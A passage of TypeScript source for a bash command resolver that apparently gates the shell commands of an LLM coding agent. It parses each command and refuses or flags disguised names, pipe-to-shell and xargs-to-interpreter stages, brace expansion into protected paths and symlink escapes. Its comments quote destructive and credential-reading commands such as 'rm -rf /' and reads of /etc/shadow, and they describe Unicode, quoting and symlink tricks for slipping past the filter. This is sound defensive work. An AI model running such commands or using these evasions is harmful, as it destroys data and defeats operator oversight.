  //                                    (PATH lookup may consult
  //                                    /etc/profile.d/* in some
  //                                    shells — over-conservative
  //                                    but cheap).
  //   cmdSysInfoNoEtc (no /etc)    — date / uptime / hostname /
  //                                    uname / printenv (kernel
  //                                    syscalls + own environ).
  //
  // Pre-slice all of them shared cmdSysInfo's readFs('/etc'),
  // which was a false positive that bloated the resolved
  // capability set and tripped `workspace_escape` in the score
  // gate for `date`.
  ['whoami', cmdSysInfo],
  ['id', cmdSysInfo],
  ['groups', cmdSysInfo],
  ['hostname', cmdSysInfoNoEtc],
  ['uname', cmdSysInfoNoEtc],
  ['uptime', cmdSysInfoNoEtc],
  ['date', cmdSysInfoNoEtc],
  // Slice 139 C1: `env` moved to its own resolver — was on
  // cmdSysInfo, which laundered exec attribution for
  // `env <prog> [args]` shapes.
  ['env', cmdEnv],
  // printenv reads its own environ, not /etc — slice 152 moves
  // it to cmdSysInfoNoEtc to match its actual surface.
  ['printenv', cmdSysInfoNoEtc],
  ['which', cmdSysInfo],
  ['type', cmdSysInfo],
  // `command` removed slice 128 (R4 P0-Launder-1) — now hard-refused
  // via HARD_REFUSE_COMMANDS. Was treating `command` as a noop
  // sysinfo verb, silently laundering capability attribution for
  // the actual command it ran.
  // Navigation (no persistent side-effect across tool calls)
  ['cd', cmdCd],
  // Slice 120 — archive / remote / build (R2 #199)
  ['tar', cmdTar],
  ['tee', cmdTee],
  ['ssh', cmdSsh],
  ['scp', cmdScp],
  ['rsync', cmdRsync],
  ['make', cmdMake],
  ['cargo', cmdCargo],
]);

// ─── AST walk ──────────────────────────────────────────────

interface CommandShape {
  name: string;
  args: string[];
  redirects: RedirectShape[];
}

interface RedirectShape {
  kind: 'out' | 'append' | 'in' | 'both' | 'force-out';
  target: string;
}

// Tree-sitter exposes anonymous nodes whose `type` is the literal
// punctuation text. They show up as children of `command` /
// `pipeline` / `list` and don't carry semantics beyond delimitation
// — anchor for grouping.
const isPunctuationType = (t: string): boolean =>
  t === '|' ||
  t === '||' ||
  t === '&&' ||
  t === ';' ||
  t === '&' ||
  t === '>' ||
  t === '>>' ||
  t === '<' ||
  t === '>|' ||
  t === '&>' ||
  t === '&>>' ||
  t === '"' ||
  t === "'";

// Codepoint ranges that smuggle non-ASCII tokens past byte-equality
// checks (slice 98, R2 #196). The tree-sitter bash grammar tokenizes
// strictly on bytes — fullwidth `；` (U+FF1B) parses as a `word`
// child, NOT as a `;` punctuation node, so a deny pattern matching
// the literal `';'` is silently bypassed; same for zero-width
// joiners hidden inside command names (`gi‍t status` reads as
// `git status` to a human and to most rendering layers but is a
// different byte sequence to the resolver), and bidi overrides
// (U+202E reverses display order, so an adversarial source line
// looks like `cat README` while executing `rm -rf /`).
//
// Defense: refuse any literal carrying these codepoints. The
// resolver's `Refuse` outcome short-circuits the call with a stable
// reason — operators can author rules against the recognized
// shape, and the LLM gets an explicit error rather than a silent
// success on the wrong literal. ASCII-only is the right boundary:
// non-ASCII filenames are legitimate (UTF-8 paths exist), but they
// MUST go through the operator's modal where the literal is
// previewed in full; bypassing rule matching on the resolver side
// would erase that intervention.
const isFullwidthAscii = (cp: number): boolean => cp >= 0xff00 && cp <= 0xffef;
const isZeroWidth = (cp: number): boolean =>
  cp === 0x200b ||
  cp === 0x200c ||
  cp === 0x200d ||
  cp === 0xfeff ||
  cp === 0x2060 ||
  cp === 0x180e;
const isBidiOverride = (cp: number): boolean =>
  (cp >= 0x202a && cp <= 0x202e) || (cp >= 0x2066 && cp <= 0x2069);
const isC1Control = (cp: number): boolean => cp >= 0x0080 && cp <= 0x009f;

const containsUnicodeBypass = (text: string): boolean => {
  for (const ch of text) {
    const cp = ch.codePointAt(0);
    if (cp === undefined) continue;
    if (isFullwidthAscii(cp) || isZeroWidth(cp) || isBidiOverride(cp) || isC1Control(cp)) {
      return true;
    }
  }
  return false;
};

// Extracts the literal text of a `word`, `string`, `raw_string`, or
// `concatenation` node. Returns null when the node carries embedded
// expansion / substitution — those should already have been refused
// by the whitelist walk; this is a defensive secondary check.
//
// Unicode-bypass check (slice 98, R2 #196): every extracted literal
// runs `containsUnicodeBypass`. A match returns null, surfaced by
// the walker as `bash_shape_not_recognized: dynamic content inside
// string arg` — same refuse semantics as embedded substitution.
const literalText = (node: Node): string | null => {
  let raw: string;
  if (node.type === 'word') {
    raw = node.text;
  } else if (node.type === 'raw_string') {
    // raw_string is always `'...'`; bash's quote removal yields the inner
    // literal. Pre-fix we returned the bytes WITH the quotes, so `'eval'`
    // resolved to the command name `'eval'` (≠ `eval`) and slipped past
    // isHardRefuseCommand / SHELL_INTERPRETERS — a quote-laundering
    // bypass once a registry miss stopped being a hard refuse. Strip the
    // surrounding single-quotes to match bash (the `string` branch below
    // already strips its quotes).
    raw = node.text.replace(/^'/, '').replace(/'$/, '');
  } else if (node.type === 'number') {
    // Tree-sitter-bash tokenizes numeric literals as their own
    // node-kind (`-p 2222`, `-maxdepth 3`). Treating them as
    // literals that flow into args keeps the resolver honest;
    // per-command handlers that care about numeric flag values
    // consume the next token explicitly.
    raw = node.text;
  } else if (node.type === 'string') {
    // string can contain string_content children and optional
    // string_expansion / command_substitution. If any of those red-
    // flag children exist we refuse upstream — here we just join the
    // text content directly.
    for (const child of node.children) {
      if (child !== null && RED_FLAG_NODES.has(child.type)) return null;
    }
    // strip surrounding quotes; tree-sitter includes them as children
    raw = node.text.replace(/^["']|["']$/g, '');
  } else if (node.type === 'concatenation') {
    let acc = '';
    for (const child of node.children) {
      if (child === null) continue;
      const inner = literalText(child);
      if (inner === null) return null;
      acc += inner;
    }
    return acc;
  } else {
    return null;
  }
  if (containsUnicodeBypass(raw)) return null;
  return raw;
};

// Strip shell quoting/escaping (`'`, `"`, `\`) from a command/interpreter
// NAME so the hard-refuse + pipe-to-shell checks see bash's effective
// name: `'eval'` / `ev''al` / `\eval` / `s'h'` all reduce to the bare
// token bash runs. Over-matches at worst (refuses an exotic literal),
// never under-matches a laundered eval/dd/sudo/sh. One source of truth
// shared by analyzeCommand + detectPipeToShell.
const stripShellQuoting = (name: string): string => name.replace(/['"\\]/g, '');

// Map a `file_redirect` node's operator + target into a RedirectShape.
// Returns null on shapes the resolver can't normalize.
const redirectShape = (node: Node): RedirectShape | null => {
  let kind: RedirectShape['kind'] | null = null;
  let target: string | null = null;
  for (const child of node.children) {
    if (child === null) continue;
    if (child.type === '>') kind = 'out';
    else if (child.type === '>>') kind = 'append';
    else if (child.type === '<') kind = 'in';
    else if (child.type === '&>' || child.type === '&>>') kind = 'both';
    else if (child.type === '>|') kind = 'force-out';
    else if (child.type === 'word' || child.type === 'string' || child.type === 'raw_string') {
      target = literalText(child);
    }
  }
  if (kind === null || target === null) return null;
  return { kind, target };
};

interface WalkResult {
  // Either a list of CommandShape objects (the AST decomposed into
  // per-command tuples) or a Refuse reason. Walk is short-circuited
  // on the first refusal — adversarial constructs anywhere in the
  // script refuse the whole script, since the whole thing executes
  // as one bash invocation.
  commands?: CommandShape[];
  refuse?: string;
  // True when the walk passed through any soft-unmodeled shape (control
  // flow, grouping, value expansion, a dynamic command ARG). Soft shapes
  // are RECURSED (not short-circuited): the inner commands are still
  // collected into `commands` and run through analyzeCommand, and the
  // resolver routes the whole call to Conservative (confirm) when `soft`
  // is set and no inner command hard-refused. A HARD construct or a
  // dynamic command NAME anywhere still produces `refuse` regardless of
  // `soft`. See `bashResolver`.
  soft?: boolean;
  // The first soft-unmodeled reason encountered (e.g. `for_statement:
  // control flow not modeled`). Carried into the Conservative reason so
  // the modal/audit name the construct, not just "unmodeled shape".
  softReason?: string;
  // Redirects on a `redirected_statement` that had NO command to attach
  // to (`[[ -e x ]] > f`, bare `> f`). The resolver classifies these
  // separately — a deny-tier target still refuses — because
  // analyzeCommand never sees a redirect that isn't on a CommandShape.
  orphanRedirects?: RedirectShape[];
}

// Recursion depth ceiling for `walkAst` (slice 98, R2 #198). A
// pathologically nested input — say, 10,000 levels of brace groups
// `{{{ ... }}}` — would otherwise blow the JS stack on `visit`'s
// recursive call into children, taking down the engine before the
// resolver could refuse with a structured envelope. 64 is well
// above legitimate shell shapes (the deepest realistic real-world
// pipeline is ~8 levels) and well below the Node 24 default
// stack budget (which permits ~1500 deep recursion in practice
// but varies by build). Refuse with a stable reason so audit /
// modal can surface the cause cleanly.
const MAX_AST_DEPTH = 64;

// Walk the AST starting at the program root. Validates every node
// against WHITELIST_NODE_TYPES and RED_FLAG_NODES; decomposes
// `command` nodes into shapes.
const walkAst = (root: Node): WalkResult => {
  const commands: CommandShape[] = [];
  // Redirects on a redirected_statement that consumed no command (see
  // WalkResult.orphanRedirects) — classified by the resolver, not here.
  const orphanRedirects: RedirectShape[] = [];
  // Set when the walk passes through any soft-unmodeled shape (control
  // flow, grouping, value expansion, a dynamic command ARG). Unlike a
  // HARD refuse (which short-circuits the walk), soft shapes are
  // RECURSED so the inner commands are still collected into `commands`
  // and the resolver can run every one through analyzeCommand. The whole
  // call then routes to Conservative (confirm) when `sawSoft` is set and
  // nothing hard-refused.
  let sawSoft = false;
  // First soft-unmodeled reason seen — carried into the Conservative
  // reason so the modal/audit name the construct.
  let softReason: string | null = null;
  // `softCtx` is true once we are INSIDE a soft-unmodeled node: there,
  // non-whitelisted STRUCTURAL nodes (do_group, case_item, `[[ ]]`
  // expression internals) are tolerated (recursed) rather than refused,
  // so the walk can reach the inner commands. HARD red-flag nodes and
  // dynamic command NAMES still refuse regardless of context.
  const visit = (node: Node, depth: number, softCtx: boolean): string | null => {
    if (depth > MAX_AST_DEPTH) {
      return `bash_shape_not_recognized: ast_depth_exceeded (>${MAX_AST_DEPTH})`;
    }
    // Red-flag check first — beats whitelist if a node is both
    // (e.g. expansion that happens to be enumerated in whitelist).
    const redFlag = RED_FLAG_NODES.get(node.type);
    if (redFlag !== undefined) {
      if (SOFT_UNMODELED_NODES.has(node.type)) {
        // Soft (control flow, value expansion): not inherently
        // dangerous. Mark soft and DESCEND (don't short-circuit) so the
        // inner commands are collected + analyzed and any inner HARD
        // construct is still caught. This is what lets
        // `for f in *.ts; do cat "$f"; done` confirm while
        // `for x in *; do rm -rf /; done` still denies (the inner rm
        // hard-refuses in analyzeCommand).
        sawSoft = true;
        softReason ??= redFlag;
        for (const child of node.children) {
          if (child === null) continue;
          const refuse = visit(child, depth + 1, true);
          if (refuse !== null) return refuse;
        }
        return null;
      }
      // HARD red-flag (command/process substitution, function def,
      // `VAR=val` prefix, arithmetic, heredoc/herestring, ansi-c,
      // subscript) → pre-policy refuse, in any context.
      return `bash_shape_not_recognized: ${redFlag}`;
    }
    // Skip ERROR nodes — tree-sitter recovers from parse errors and
    // emits ERROR placeholders. Anything error-recovered is by
    // definition outside the whitelist. Hard refuse regardless of
    // context (adversarial breakage, §12.4).
    if (node.type === 'ERROR' || node.isError) {
      return `bash_shape_not_recognized: parse_error at ${node.startPosition.row}:${node.startPosition.column}`;
    }
    if (isPunctuationType(node.type)) return null;
    if (!WHITELIST_NODE_TYPES.has(node.type)) {
      // Top level (strict): an unknown shape is a hard refuse (closed
      // whitelist). Inside a soft construct: tolerate the structural
      // node (do_group, `[[ ]]` internals, case_item, …) and recurse —
      // inner HARD nodes and commands are still validated/collected
      // below. Mark soft so the whole call routes to Conservative.
      if (!softCtx) {
        return `bash_shape_not_recognized: ${node.type}`;
      }
      sawSoft = true;
      softReason ??= `unsupported_shape: ${node.type}`;
      for (const child of node.children) {
        if (child === null) continue;
        const refuse = visit(child, depth + 1, true);
        if (refuse !== null) return refuse;
      }
      return null;
    }
    // Decompose `command` nodes into shapes.
    if (node.type === 'command') {
      const shape: CommandShape = { name: '', args: [], redirects: [] };
      for (const child of node.children) {
        if (child === null) continue;
        if (child.type === 'command_name') {
          // command_name wraps a single `word` (per grammar).
          const inner = child.namedChild(0) ?? child.children[0];
          if (inner === null || inner === undefined) {
            return 'bash_shape_not_recognized: empty command_name';
          }
          const text = literalText(inner);
          if (text === null) {
            // Dynamic command NAME ($X, ${!ref}, $(...)-derived): the
            // resolver cannot know which binary runs → HARD refuse, even
            // inside a soft construct. This is the spec's HARD tier and
            // the reason `for x in *; do $x; done` denies.
            return `bash_shape_not_recognized: dynamic command_name (${inner.type})`;
          }
          shape.name = text;
        } else if (
          child.type === 'word' ||
          child.type === 'string' ||
          child.type === 'raw_string' ||
          child.type === 'concatenation' ||
          child.type === 'number'
        ) {
          const text = literalText(child);
          if (text === null) {
            // A Unicode-disguise arg (RTL override, BOM, zero-width) is
            // adversarial — keep it a HARD refuse; the resolver can't
            // trust the visual form. Distinct from a benign dynamic value
            // like "$f", which is soft → confirm.
            if (containsUnicodeBypass(child.text)) {
              return 'bash_shape_not_recognized: unicode bypass in arg';
            }
            // Dynamic ARG value (e.g. "$f"). Unlike a dynamic NAME this
            // isn't categorically dangerous — the command is known. Mark
            // soft, DESCEND to catch any HARD construct hiding inside the
            // arg (e.g. "$(evil)"), then skip the unresolved literal.
            sawSoft = true;
            softReason ??= 'dynamic value in arg';
            const refuse = visit(child, depth + 1, softCtx);
            if (refuse !== null) return refuse;
            continue;
          }
          shape.args.push(text);
        } else if (child.type === 'file_redirect') {
          const r = redirectShape(child);
          if (r === null) {
            // Non-literal redirect target: kept a HARD refuse (a
            // runtime-computed write destination the resolver can't
            // classify) — unchanged from prior behavior.
            return 'bash_shape_not_recognized: redirect target is non-literal';
          }
          shape.redirects.push(r);
        } else if (!isPunctuationType(child.type)) {
          // Recurse into red-flag check / unknown (e.g. a bare
          // `simple_expansion` arg → soft).
          const refuse = visit(child, depth + 1, softCtx);
          if (refuse !== null) return refuse;
        }
      }
      if (shape.name === '') {
        return 'bash_shape_not_recognized: command without name';
      }
      commands.push(shape);
      return null;
    }
    // For `redirected_statement`, its first child is usually a
    // command and the rest are file_redirects. Treat them inline.
    if (node.type === 'redirected_statement') {
      // Walk children — the command will register itself, and the
      // file_redirects need to be merged into the most recently
      // pushed command.
      const before = commands.length;
      for (const child of node.children) {
        if (child === null) continue;
        const refuse = visit(child, depth + 1, softCtx);
        if (refuse !== null) return refuse;
      }
      // Merge any file_redirects that appeared as siblings into the
      // last command.
      const lastCmd = commands[commands.length - 1];
      if (lastCmd !== undefined && commands.length > before) {
        for (const child of node.children) {
          if (child !== null && child.type === 'file_redirect') {
            const r = redirectShape(child);
            if (
              r !== null &&
              !lastCmd.redirects.some((x) => x.kind === r.kind && x.target === r.target)
            ) {
              lastCmd.redirects.push(r);
            }
          }
        }
      } else {
        // No command consumed this statement's redirect (`[[ -e x ]] > f`,
        // bare `> f`). Collect the targets as orphans so the resolver
        // still classifies them — a deny-tier redirect with no command
        // must refuse, not slip through as a no-command Conservative.
        for (const child of node.children) {
          if (child !== null && child.type === 'file_redirect') {
            const r = redirectShape(child);
            if (r !== null) orphanRedirects.push(r);
          }
        }
      }
      return null;
    }
    // For `program` / `list` / `pipeline` / `string` / etc. just
    // recurse into children — the walk validates each level.
    for (const child of node.children) {
      if (child === null) continue;
      const refuse = visit(child, depth + 1, softCtx);
      if (refuse !== null) return refuse;
    }
    return null;
  };

  const refuse = visit(root, 0, false);
  if (refuse !== null) return { refuse };
  return {
    commands,
    soft: sawSoft,
    ...(softReason !== null ? { softReason } : {}),
    ...(orphanRedirects.length > 0 ? { orphanRedirects } : {}),
  };
};

// Detect pipe-to-shell on a `pipeline` node. Returns the offending
// stage name when found.
//
// Slice 147 (review R1): added xargs-to-interpreter detection.
// `... | xargs sh -c '<arg>'` is the canonical xargs-as-exec
// pattern: xargs reads stdin lines and passes each as positional
// args to the inner command. When that inner command is a shell
// or interpreter, every line becomes an exec'd script. The last
// pipe stage's command_name is `xargs`, not the inner interpreter
// — pre-slice the detection bailed out on `xargs` because it
// wasn't in `SHELL_INTERPRETERS`. Now we additionally scan the
// xargs argv for any embedded interpreter token.
const detectPipeToShell = (root: Node): string | null => {
  const pipelines = root.descendantsOfType('pipeline');
  for (const pipeline of pipelines) {
    const stages = pipeline.children.filter((c) => c !== null && c.type === 'command') as Node[];
    if (stages.length < 2) continue;
    const last = stages[stages.length - 1];
    if (last === undefined) continue;
    const nameNode = last.childForFieldName('name') ?? last.namedChild(0);
    if (nameNode === null || nameNode === undefined) continue;
    const text = literalText(nameNode.children[0] ?? nameNode) ?? nameNode.text;

    // Direct pipe-to-interpreter: last stage IS a known
    // stdin-reading interpreter (`sh`, `bash`, `python`, `node`, etc.).
    // Check the quote/escape-stripped form too (`s'h'` → sh, `\sh` → sh)
    // to match bash's quote removal — literalText handles raw_string
    // quotes; this covers backslash + residual laundering.
    if (SHELL_INTERPRETERS.has(text) || SHELL_INTERPRETERS.has(stripShellQuoting(text))) {
      return text;
    }

    // xargs-wrapped exec: `... | xargs sh -c '<arg>'`,
    // `... | xargs python -c '<arg>'`, etc. xargs's positional
    // structure is fiddly — flags can take values (`-I {}`,
    // `-n 1`, `--max-procs 4`) — so rather than parse it
    // precisely, scan EVERY namedChild after the command_name
    // and refuse if any of them resolves to an interpreter
    // literal. Over-refuses for hypothetical `xargs --some-flag
    // bash` where bash isn't actually exec'd; underrefuses
    // nothing dangerous.
    if (text === 'xargs') {
      const argChildren = last.namedChildren.slice(1);
      for (const child of argChildren) {
        if (child === null || child === undefined) continue;
        const argText = literalText(child) ?? child.text;
        if (SHELL_INTERPRETERS.has(argText) || SHELL_INTERPRETERS.has(stripShellQuoting(argText))) {
          return `xargs ${argText}`;
        }
      }
    }
  }
  return null;
};

// ─── Per-command analysis ──────────────────────────────────

const isReadOnlyCommand = (name: string): boolean => {
  switch (name) {
    case 'ls':
    case 'cat':
    case 'head':
    case 'tail':
    case 'wc':
    case 'file':
    case 'stat':
    case 'pwd':
    case 'grep':
    case 'rg':
    case 'find':
    // Read-only filters (registry expansion, PERMISSION_ENGINE.md §5.2).
    // Classified read-only so their path args resolve as `read` (not
    // `write`) in the protected-path loop — same posture as cat/wc.
    case 'sort':
    case 'uniq':
    case 'cut':
    case 'comm':
    case 'paste':
    case 'tr':
    case 'nl':
    case 'tac':
    case 'rev':
    case 'fold':
    case 'column':
    case 'diff':
    case 'cmp':
    case 'jq':
    case 'du':
    case 'df':
    case 'tree':
    case 'basename':
    case 'dirname':
      return true;
    default:
      return false;
  }
};

// Pure-output commands: their positional args are literal strings
// emitted to stdout, not paths. The per-arg protected-path loop is
// skipped for these. Redirects are still inspected separately
// because `echo hi > /etc/foo` does write to /etc/foo regardless
// of which command produced the bytes.
const isPureOutputCommand = (name: string): boolean => name === 'echo' || name === 'printf';

// Slice 125 (R2 P0-3): shell brace + glob expansion helpers.
// Bash's brace expansion (`{a,b}`) is FS-INDEPENDENT — the shell
// expands deterministically before exec. Glob expansion (`*`, `?`,
// `[`) is FS-dependent — runs at exec time against the live FS.
// The resolver can pre-expand braces safely; for globs the best
// we can do is detect the literal prefix and refuse if it could
// lead into a protected zone.

const GLOB_METACHAR_RE = /[*?[]/;

const containsGlobMetachar = (s: string): boolean => GLOB_METACHAR_RE.test(s);

// Extract the literal prefix of a glob pattern — everything before
// the first `*`/`?`/`[`/`{`. Used to compare against protected
// zone roots without resolving runtime glob expansion.
const globLiteralPrefix = (arg: string): string => {
  for (let i = 0; i < arg.length; i += 1) {
    const c = arg[i];
    if (c === '*' || c === '?' || c === '[' || c === '{') return arg.slice(0, i);
  }
  return arg;
};

// Expand brace patterns deterministically. Supports comma lists
// `{a,b,c}` with arbitrary nesting. Numeric / character ranges
// (`{1..5}`, `{a..z}`) are NOT expanded — those rely on bash-
// specific semantics; we return [arg] unchanged for safety
// (caller's classifier still handles literal prefix). A pattern
// with mismatched braces returns [arg] as-is.
//
// Hard cap on expansion count: 1024 results. Beyond that we
// abandon expansion to avoid pathological inputs like
// `{a,b}{a,b}{a,b}...` exploding factorially. Caller treats this
// as "could be anything"; combine with the glob-metachar refuse
// path for safety.
const MAX_BRACE_EXPANSIONS = 1024;
// Slice 129 (R5 P1 stack): recursion-depth cap orthogonal to the
// total-output cap. A pathological input shape like
// `a{b{c{d{...}}}}` (deep nesting, single comma each level) stays
// well under MAX_BRACE_EXPANSIONS — each level emits one string —
// but the visit() function recurses once per nest. Without a depth
// guard, hostile inputs of e.g. 100_000 nested braces blow the JS
// stack. 64 covers every realistic shell pattern (Bash itself
// stops being useful around 8-10 levels) while keeping recursion
// well inside V8's ~10k frame budget.
const MAX_BRACE_DEPTH = 64;
const expandBraces = (arg: string): string[] => {
  const out: string[] = [];
  const visit = (s: string, recursionDepth: number): void => {
    if (out.length >= MAX_BRACE_EXPANSIONS) return;
    if (recursionDepth > MAX_BRACE_DEPTH) {
      // Bail to literal — caller's classifier still picks up the
      // glob-metachar refuse path if any `{` remains.
      out.push(s);
      return;
    }
    const open = s.indexOf('{');
    if (open === -1) {
      out.push(s);
      return;
    }
    // Find matching close, tracking nesting.
    let depth = 1;
    let close = -1;
    for (let i = open + 1; i < s.length; i += 1) {
      const c = s[i];
      if (c === '{') depth += 1;
      else if (c === '}') {
        depth -= 1;
        if (depth === 0) {
          close = i;
          break;
        }
      }
    }
    if (close === -1) {
      out.push(s);
      return;
    }
    const middle = s.slice(open + 1, close);
    // Split top-level commas (ignore commas inside nested braces).
    const parts: string[] = [];
    let nested = 0;
    let last = 0;
    for (let i = 0; i < middle.length; i += 1) {
      const c = middle[i];
      if (c === '{') nested += 1;
      else if (c === '}') nested -= 1;
      else if (c === ',' && nested === 0) {
        parts.push(middle.slice(last, i));
        last = i + 1;
      }
    }
    parts.push(middle.slice(last));
    const prefix = s.slice(0, open);
    const suffix = s.slice(close + 1);
    if (parts.length < 2) {
      // Slice 127 (R3 P1): single-element brace MAY be a range
      // (`{a..z}`, `{1..10}`). Bash expands these deterministically
      // — `rm /e{a..z}c/passwd` includes `/etc/passwd`. Pre-slice
      // we emitted the literal which doesn't classify as protected.
      // Detect single-char `start..end` and integer `start..end`
      // (no step support; bash's `..N` step is rare in agent code).
      const rangeMatch = middle.match(/^(.+?)\.\.(.+?)$/);
      if (rangeMatch !== null) {
        const [, start, end] = rangeMatch as [string, string, string];
        const startNum = Number.parseInt(start, 10);
        const endNum = Number.parseInt(end, 10);
        // Integer range.
        if (
          start === String(startNum) &&
          end === String(endNum) &&
          Number.isFinite(startNum) &&
          Number.isFinite(endNum)
        ) {
          const lo = Math.min(startNum, endNum);
          const hi = Math.max(startNum, endNum);
          // Cap iteration via the global MAX_BRACE_EXPANSIONS
          // check inside the loop; large ranges fall through to
          // the literal-prefix glob defense.
          for (let v = lo; v <= hi; v += 1) {
            visit(prefix + String(v) + suffix, recursionDepth + 1);
            if (out.length >= MAX_BRACE_EXPANSIONS) return;
          }
          return;
        }
        // Single-char range — bash semantics: `{a..z}` expands
        // 26 chars. Multi-char endpoints stay literal.
        if (start.length === 1 && end.length === 1) {
          const lo = Math.min(start.charCodeAt(0), end.charCodeAt(0));
          const hi = Math.max(start.charCodeAt(0), end.charCodeAt(0));
          for (let v = lo; v <= hi; v += 1) {
            visit(prefix + String.fromCharCode(v) + suffix, recursionDepth + 1);
            if (out.length >= MAX_BRACE_EXPANSIONS) return;
          }
          return;
        }
        // Malformed range (e.g., `aa..zz`, mixed types) — fall
        // through to literal; glob-metachar branch picks it up.
      }
      out.push(s);
      return;
    }
    for (const p of parts) {
      visit(prefix + p + suffix, recursionDepth + 1);
      if (out.length >= MAX_BRACE_EXPANSIONS) return;
    }
  };
  visit(arg, 0);
  return out;
};

// Test whether a literal-prefix path could reach any SYSTEM-level
// protected target via glob expansion. True iff some protected
// target's absolute path overlaps with the literal prefix at a
// SEGMENT BOUNDARY (either the target equals the prefix, OR the
// target is a strict prefix-extension of the prefix that COULD
// be reached by glob expansion at the next segment).
//
// Deliberately EXCLUDES `cwdEscalateDirs` (`.git`, `.agent`,
// `.claude` under cwd): a legitimate glob like `*.ts` in cwd
// resolves to `<cwd>/*.ts` whose literal prefix is `<cwd>/` — that
// trivially matches every cwd-relative protected dir. Including
// cwdEscalateDirs would refuse every glob under cwd as a bypass,
// which is way too aggressive. The bypass threat that matters here
// is SYSTEM-level (`/etc/*`, `/proc/*`, `~/.ssh/*`); cwd-relative
// targets are caught by the per-expansion classifyProtectedPath
// path when the glob is brace-expanded (or by the operator's
// explicit allow/confirm rule shape).
//
// Slice 127 (R3 P0-2): segment-aware match instead of byte-wise
// startsWith. Pre-slice: when `cwd === $HOME` (e.g., `/home/op`),
// glob `*` resolves to literal prefix `/home/op` (NO trailing
// slash); tildeEscalateDirs `/home/op/.ssh` matched via
// `t.startsWith(absLiteralPrefix)` because `/home/op/.ssh`
// literally starts with `/home/op` (consecutive bytes). That made
// `ls *` / `cat *` from `~` refuse — a high-traffic regression.
// The fix: the literal prefix must overlap a protected target at
// a SEGMENT BOUNDARY (the protected target shares the prefix AND
// the next byte in the target is `/` OR the prefix already ends
// in `/`). Bare `/home/op` does NOT segment-match `/home/op/.ssh`
// — the glob `*` from cwd `/home/op` matches FILENAMES under
// `/home/op`, not paths that descend into a subdir.
const couldGlobReachProtected = (
  absLiteralPrefix: string,
  targets: ReturnType<typeof protectedTargets>,
): boolean => {
  // Removable-media carve-out (mirrors SYSTEM_DENY_EXCEPTIONS, glob
  // subset). A literal prefix under `/run/media/<user>/<volume>` is a
  // mounted user filesystem — no protected target is reachable by
  // expansion from there. The `systemDeny` scan below consumes the RAW
  // `/run` root, so without this guard every glob run from a repo on
  // removable media is refused (the literal prefix resolves under
  // `/run/`). `/run/user` is deliberately NOT carved out — see
  // `isGlobSafeRunCarveout`: a glob there could expand into XDG IPC
  // sockets, so it stays conservatively refused.
  if (isGlobSafeRunCarveout(absLiteralPrefix)) return false;
  const all: string[] = [
    ...targets.systemDeny,
    ...targets.absoluteEscalate,
    ...targets.tildeEscalateFiles,
    ...targets.tildeEscalateDirs,
  ];
  // Normalize: a literal-prefix that ends in `/` is "in a parent
  // directory; glob fills in the next segment". A literal-prefix
  // that does NOT end in `/` is "matching a filename in some
  // parent dir; glob fills in the rest of the filename".
  const prefixEndsAtSeparator = absLiteralPrefix.endsWith('/');
  for (const t of all) {
    // Exact match — the prefix IS the protected target.
    if (t === absLiteralPrefix) return true;
    // Prefix is INSIDE a protected target — glob could match
    // arbitrary descendants. The `t/`-prefix form is the segment
    // boundary on the target side.
    if (absLiteralPrefix.startsWith(`${t}/`)) return true;
    // Protected target is inside the prefix's "next-segment" zone.
    // Discriminator: target must extend the prefix at a segment
    // boundary — either prefix ends in `/` (next segment is being
    // glob-expanded) OR target has more characters before a `/`
    // boundary that the glob filename-match could cover.
    if (t.startsWith(absLiteralPrefix)) {
      const rest = t.slice(absLiteralPrefix.length);
      if (prefixEndsAtSeparator) {
        // Prefix is parent-dir-style. Glob next segment could
        // match any filename including those that lead into
        // protected subtrees. Match.
        return true;
      }
      // Prefix is filename-style (no trailing `/`). The protected
      // target is reachable only if `rest` extends within the SAME
      // filename segment — i.e., `rest` contains no `/`. If `rest`
      // starts with `/`, the protected target is in a SUBDIR of the
      // prefix's parent, which the filename glob can't reach.
      if (!rest.startsWith('/') && !rest.includes('/')) {
        // Glob could complete the filename to match the protected
        // target. E.g., prefix `/etc/passw` (from `/etc/passw*`)
        // could complete to `/etc/passwd`. Match.
        return true;
      }
      // rest starts with `/` (e.g., prefix `/home/op`, target
      // `/home/op/.ssh`). Filename glob can't traverse into
      // subdirs. NOT a bypass — slice 127 R3 P0-2 fix.
    }
  }
  return false;
};

// Slice 176 (review — command-bypass P0 #5). Lexical-only
// classification is unsound against symlinks. An attacker (or a
// prior LLM-driven write) creates a symlink at a path that lexically
// looks safe (`/work/proj/innocent.txt`) but resolves to a protected
// target (`/etc/shadow`). `cat innocent.txt` analyzed lexically
// matches no protected zone — the classifier returns null and the
// resolver emits `readFs(/work/proj/innocent.txt)` with confidence
// high. But the kernel follows the symlink at exec time and reads
// `/etc/shadow`, walking past §11's deny tier.
//
// Defense: when `ctx.realpath` is wired, ALSO classify the canonical
// form of every arg/redirect path and return the more dangerous tier.
// Two realpath strategies, applied in order:
//
//   1. Full-path realpath. Catches existing-symlink shapes (the
//      dominant case: file or dir at the given path is itself a
//      symlink). Throws ENOENT for paths that don't exist yet
//      (write-creates-new-file) — that's correct; fall through.
//
//   2. Parent-dir realpath + rejoin basename. Catches the rarer
//      shape where the leaf doesn't exist but the parent dir is a
//      symlink. E.g., cwd=/work/proj, `proj` symlinks to `/etc`;
//      writing `proj/new.conf` lexically looks safe but actually
//      writes `/etc/new.conf`. ENOENT on parent → fall back to
//      lexical (already classified).
//
// The lexical classification is ALWAYS run; canonical classification
// only escalates the tier upward, never relaxes it.
const tierRank = (t: 'deny' | 'escalate' | null): number =>
  t === 'deny' ? 2 : t === 'escalate' ? 1 : 0;

// The symlink-aware defenses below silently no-op when
// `ctx.realpath` is missing — intentional for tests (which build
// paths that don't exist on disk) but catastrophic in production
// if the engine wire-up is ever removed. The warning fires once
// per process and only when the caller didn't opt out via
// `ctx.suppressDegradeWarnings`. Production wiring leaves the
// flag undefined; the warning IS the audit signal that flags
// regression.
//
// TODO: in headless / CI environments where stderr isn't
// captured, the warning can be swallowed silently. Promote to a
// `failure_events` row once ResolverContext carries the failure
// sink — the tamper-evident table is queryable and survives log
// rotation.
let realpathMissingWarned = false;
const warnRealpathMissingOnce = (ctx: ResolverContext): void => {
  if (realpathMissingWarned) return;
  if (ctx.suppressDegradeWarnings === true) return;
  realpathMissingWarned = true;
  process.stderr.write(
    'forja: bash resolver running WITHOUT realpath/readlink wired — symlink-escape defenses (slices 176, 178) are inactive. Production wiring at engine.ts injects fs.realpathSync/readlinkSync; if you see this in production, the wire-up was removed.\n',
  );
};

// Test seam — reset the warn-once latch so a test exercising the
// warning path can verify it fires. Production callers never need
// this; it's symmetric to the other __reset*ForTest helpers in this
// module's neighborhood.
export const __resetRealpathWarnLatchForTest = (): void => {
